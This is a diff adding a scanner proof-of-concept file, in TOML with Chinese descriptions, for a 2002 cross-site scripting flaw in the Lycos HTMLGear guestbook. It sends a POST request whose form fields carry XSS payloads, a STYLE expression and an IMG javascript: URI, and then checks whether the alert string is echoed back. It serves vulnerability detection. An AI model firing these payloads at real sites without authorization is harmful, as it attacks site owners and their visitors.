@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过 guestbook 留言字段注入 XSS 载荷，验证 Lycos HTMLGear 是否存在跨站脚本漏洞。该漏洞允许攻击者在留言簿输入中通过 IMG 标签的 SRC 属性或 STYLE 样式属性注入任意脚本代码，当其他用户访问包含恶意内容的留言页面时脚本将在浏览器中执行。"
+id = "POC-AVE-2002-0611"
+name = "Lycos HTMLGear guestbook XSS PoC"
+severity = "medium"
+tags = ["ave-2002-0611"]
+vuln_id = [
+    "CVE-2002-1493",
+    "AVE-2002-0611",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/htmlggear/guestbook.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = """name=AVE&email=" STYLE="expression(alert('XSS'))&message=<IMG SRC="javascript:alert('XSS')">&submit=Submit"""
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["alert('XSS')"]
